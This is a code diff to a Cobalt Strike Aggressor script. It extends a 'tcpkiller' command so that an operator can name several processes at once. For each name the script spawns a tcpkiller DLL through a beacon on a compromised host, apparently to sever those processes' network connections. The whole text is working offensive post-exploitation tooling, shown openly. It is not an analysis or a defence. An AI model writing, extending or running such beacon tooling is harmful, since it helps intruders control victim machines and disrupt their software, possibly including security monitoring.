@@ -6,7 +6,7 @@ debug(debug() | 34);    # 34 = "throw" all errors flagged for use with &checkErr
 
 alias tcpkiller {
     local('$bid $args $processName $interval $duration');
-    local('$msg $dllName $arch');
+    local('$msg $dllName $arch @processNameList $item $title');
 
     ($bid, $processName, $duration) = @_;
     # interval_ms: check target process every 1 sec as default.
@@ -23,10 +23,37 @@ alias tcpkiller {
         $arch = barch($bid);
         $duration = iff(int($duration) < 0, 5, int($duration));
         $dllName = iff($arch eq "x64", "tcpkiller.x64.dll", "tcpkiller.x86.dll");
-        
-        $args = $processName . ' 1000 ' . $duration;
-        btask($bid, "Tasked beacon to execute tcpkiller " . $args);
-        bdllspawn($bid, script_resource($dllName), $args, "tcpkiller", 3000, false);
+
+        if ($processName ismatch '.*,.*') {
+            @processNameList = split(',', $processName);
+            foreach $item (@processNameList) {
+                $item = matches($item, '^\s*(.*?)\s*$')[0];
+                $item = lc($item);
+                if ($item ismatch '.*\.exe$') {
+                    $title = "tcpkiller ( $+ $item $+ )";
+                    $args = $item . ' 1000 ' . $duration;
+                    btask($bid, "Tasked beacon to execute tcpkiller " . $args . ' (multiple)');
+                    bdllspawn($bid, script_resource($dllName), $args, $title, 3000, false);
+                }
+                else {
+                    $msg = 'Process name argument error: ' . $item;
+                    berror($bid, $msg);
+                }
+            }
+        }
+        else {
+            $processName = lc($processName);
+            if ($processName ismatch '.*\.exe$') {
+                $title = "tcpkiller ( $+ $processName $+ )";
+                $args = $processName . ' 1000 ' . $duration;
+                btask($bid, "Tasked beacon to execute tcpkiller " . $args . ' (single)');
+                bdllspawn($bid, script_resource($dllName), $args, $title, 3000, false);
+            }
+            else {
+                $msg = 'Process name argument error: ' . $processName;
+                berror($bid, $msg);
+            }
+        }
     }
 }
 
